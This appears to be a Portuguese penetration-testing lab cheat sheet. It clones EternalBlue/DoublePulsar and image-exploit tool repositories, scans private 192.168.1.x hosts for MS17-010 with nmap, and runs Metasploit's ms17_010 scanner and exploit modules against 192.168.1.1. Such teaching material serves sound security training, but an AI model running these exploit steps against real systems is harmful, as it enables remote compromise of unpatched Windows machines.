git clone https://github.com/vaamonde/nmap-nse-scripts
 
git clone https://github.com/vaamonde/exploit

git clone https://github.com/vaamonde/Eternalblue-Doublepulsar-Metasploit

git clone https://github.com/vaamonde/FakeImageExploiter

Verificar versão do NMAP:<br>	nmap --version<br>
				man nmap<br>
				
nmap -O -A -sV 192.168.1.0/24
-O = detecção do Sistema Operacional
-A = detecção do Sistema Operacional e Versão
-sV = detecção do Sistema Operacional e Versão

nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse localhost<br>
-d = habilita a Debug (log detalhado, pode ir até a opção 9)
-sC = habilitar o rastreamento de scann de portas
-p = número da porta a rastrear (445 - Microsoft-df - SMB/CIFS)
--open = verificar somente portas abertas
--max-hostgroup = número máximo de grupos para o scaneamento
--script = indicar script remoto para o scan

nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse 192.168.1.0/24<br>

nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse 192.168.1.150<br>

Atualizar o Metasploit:		msfupdate<br>
Acessar o Metasploit:		msfconsole<br>
Reload dos Exploit		reload_all<br>
Acessar o Modo Scan:<br>		use auxiliary/scanner/smb/smb_ms17_010<br>
				show options<br>
				set rhosts 192.168.1.1<br>
				exploit<br>
							
Acessar o modo Exploit:	<br>	use exploit/ms17_010/ms_17_010<br>
				show options<br>
				set rhosts 192.168.1.1<br>
				exploit<br>
